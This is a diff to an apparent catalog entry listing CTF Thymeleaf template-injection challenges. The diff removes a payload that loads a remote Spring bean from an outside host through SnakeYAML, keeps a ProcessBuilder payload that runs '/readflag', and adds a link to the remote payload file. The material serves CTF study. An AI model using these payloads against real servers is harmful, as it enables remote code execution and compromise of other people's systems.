@@ -6,7 +6,7 @@ description: "Example
 DDCTF 2020 - Easy Web
 Codegate 2023 - AI
 
-from Pew: $__|{springRequestContext.getClass().forName(\"org.yaml.snakeyaml.Yaml\").newInstance().load(thymeleafRequestContext.httpServletRequest.getParameter(\"a\"))}|__(xx=id)?a=!!org.springframework.context.support.FileSystemXmlApplicationContext [\"https://thegrandpewd.pythonanywhere.com/pwn.bean\"]
+
 
 
 DEVCORE Wargame 2024 - Spring
@@ -17,5 +17,8 @@ thymeleaf 3.0.15: __*{new.java.lang.String(new.java.lang.ProcessBuilder('/readfl
 
 "
 external_category: "Web Exploitation"
----[Visit Website](https://github.com/w181496/CTF/tree/master/wctf2020/thymeleaf)
+---
+[Visit Website](https://thegrandpewd.pythonanywhere.com/pwn.bean\)
+
+[Visit Website](https://github.com/w181496/CTF/tree/master/wctf2020/thymeleaf)
 
